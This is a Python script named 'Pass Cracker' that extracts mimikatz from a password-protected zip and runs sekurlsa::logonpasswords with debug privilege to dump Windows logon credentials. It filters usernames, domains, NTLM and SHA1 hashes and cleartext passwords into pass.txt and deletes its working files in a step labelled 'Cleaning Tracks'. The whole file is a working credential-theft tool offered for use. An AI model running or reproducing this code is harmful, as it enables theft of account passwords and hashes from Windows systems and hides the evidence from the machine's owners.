import subprocess
import shutil
import os
from tempfile import gettempdir
import pathlib
import zipfile
from colorama import Fore, Style, init
import ctypes

PATH = gettempdir() + "//mimikatz"
my = set()


def print_out(string, _type, end="\n"):
    if _type != "":
        if string != "":
            if _type == "error":
                print(Fore.RED + string, Style.RESET_ALL, end=end)
            elif _type == "success":
                print(Fore.LIGHTGREEN_EX + string, Style.RESET_ALL, end=end)
            elif _type == "warning":
                print(Fore.YELLOW + string, Style.RESET_ALL, end=end)
            elif _type == "normal":
                print(Fore.WHITE + string, end=end)


def fetch():
    timeout = 3
    args = [PATH + "//x64//MIMIKATZ.EXE",
            "privilege::debug",
            "log passwords.log",
            "sekurlsa::logonpasswords"]

    try:
        subprocess.call(args=args, stdout=subprocess.PIPE, timeout=timeout)
    except subprocess.TimeoutExpired:
        pass


def clean():
    for the_file in os.listdir(PATH):
        file_path = os.path.join(PATH, the_file)
        try:
            if os.path.isfile(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
            os.rmdir(PATH)
        except Exception as e:
            pass


def unzip():
    pathlib.Path(PATH).mkdir(parents=True, exist_ok=True)
    zipf = zipfile.ZipFile('resource.zip', 'r')
    zipf.extractall(PATH, pwd=b'badboyseventeen')
    zipf.close()


def arrange():
    file = open('passwords.log', "r")
    read = file.read()
    for line in read.splitlines():
        if "SID" in line:
            my.add(line + "\n")
            continue
        elif "NTLM" in line:
            my.add(line + "\n")
            continue
        elif "SHA1" in line:
            my.add(line + "\n")
            continue
        elif "Username" in line:
            my.add(line + "\n")
            continue
        elif "Domain" in line:
            my.add(line + "\n")
            continue
        elif "Password" in line:
            my.add(line + "\n")
            continue

        file = open('pass.txt', "w")
        file.write("-" * 108 + "\n")
        file.write("-" * 42 + " Pass Cracker Results " + "-" * 44 + "\n")
        file.write("-" * 108 + "\n")

        for item in my:
            file.write("{0} \n".format(item))
        file.close()


def check_req():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


if __name__ == '__main__':
    init()
    if check_req() and os.path.isfile('resource.zip'):
        print_out("[*] Unzipping Files...", "normal", end='')
        unzip()
        print_out(" -> Done!", 'success')

        print_out("[*] Fetching Passwords...", "normal", end='')
        fetch()
        print_out(" -> Done!", 'success')

        print_out("[*] Cleaning Tracks...", "normal", end='')
        clean()
        arrange()
        print_out(" -> Done!", 'success')

        if os.path.isfile('passwords.log'):
            os.remove('passwords.log')

        for item in my:
            if "Password" in item:
                if "(null)" not in item:
                    print_out("\n\n[*] Password:" + item[14:], "success")

        print_out('NOTE:  ', "error", end='')
        print_out("[*] Additional information stored in 'pass.txt'.", "warning")
    else:
        print_out("[-] Error: Something went wrong.\n1. Run \'Pass Cracker\' with ADMIN RIGHTS"
                  "\n2. Make sure \'resource.zip\' is in the current directory",
                  "error")
    input('\nPress ENTER key to exit')
